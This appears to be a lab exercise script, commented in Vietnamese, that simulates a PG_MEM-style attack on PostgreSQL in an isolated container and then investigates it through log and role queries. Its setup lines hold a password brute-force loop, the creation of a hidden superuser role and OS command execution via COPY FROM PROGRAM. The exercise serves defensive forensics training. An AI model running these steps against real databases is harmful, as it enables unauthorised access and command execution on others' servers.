# 12.3 phần 2 — dò mật khẩu từ 203.0.113.66 (máy "ngoài Internet"); postgres có mật khẩu yếu. Mô phỏng chuỗi PG_MEM (Aqua 2024):
# đoán mật khẩu → tạo vai trò siêu người dùng → COPY … FROM PROGRAM chạy lệnh hệ điều hành. Chỉ trong container --network none.
!psql -qc "ALTER ROLE postgres PASSWORD 'postgres123'"; psql -qc "ALTER SYSTEM SET log_statement = 'ddl'" -c "SELECT pg_reload_conf()"
!for u in postgres admin root pgsql; do for p in 123456 password postgres admin root P@ssw0rd 12345678 qwerty postgres123; do PGPASSWORD=$p PGCONNECT_TIMEOUT=3 psql -h 203.0.113.66 -U $u -d postgres -Atc "SELECT 'VAO ' || current_user" 2>/dev/null && break; done; done; sleep 0.3
!PGPASSWORD=postgres123 psql -h 203.0.113.66 -U postgres -d postgres -qc "CREATE ROLE pgg_sync WITH LOGIN SUPERUSER PASSWORD 'x9!Kq2'" -c "DROP TABLE IF EXISTS tmp_out" -c "CREATE TABLE tmp_out (t text)" -c "COPY tmp_out FROM PROGRAM 'id; uname -m'" -c "SELECT * FROM tmp_out" -c "DROP TABLE tmp_out" >/dev/null 2>&1
grep -h 'client=203.0.113.66' log/postgresql-*.log | grep -c 'password authentication failed'
grep -h 'password authentication failed' log/postgresql-*.log | grep -oE 'client=[0-9.]+' | sort | uniq -c
grep -h 'client=203.0.113.66 FATAL' log/postgresql-*.log | grep -oE '[a-z]+@postgres' | sort | uniq -c
grep -h 'client=203.0.113.66' log/postgresql-*.log | grep -vE 'FATAL|DETAIL|connection received' | cut -c1-200
jq -r 'select(.remote_host == "203.0.113.66" and .error_severity == "FATAL") | .timestamp[11:19]' log/postgresql-*.json | sed -n '1p;$p'
jq -r 'select(.remote_host == "203.0.113.66" and .error_severity == "FATAL") | .detail | split("\n")[0] | .[0:60]' log/postgresql-*.json | sort | uniq -c
psql -Atc "SELECT rolname, rolsuper, rolcanlogin FROM pg_roles WHERE rolsuper ORDER BY 1"
psql -c "SELECT line_number, type, database, user_name, address, auth_method FROM pg_hba_file_rules"
!psql -qc 'DROP ROLE pgg_sync' -c "ALTER ROLE postgres PASSWORD NULL"
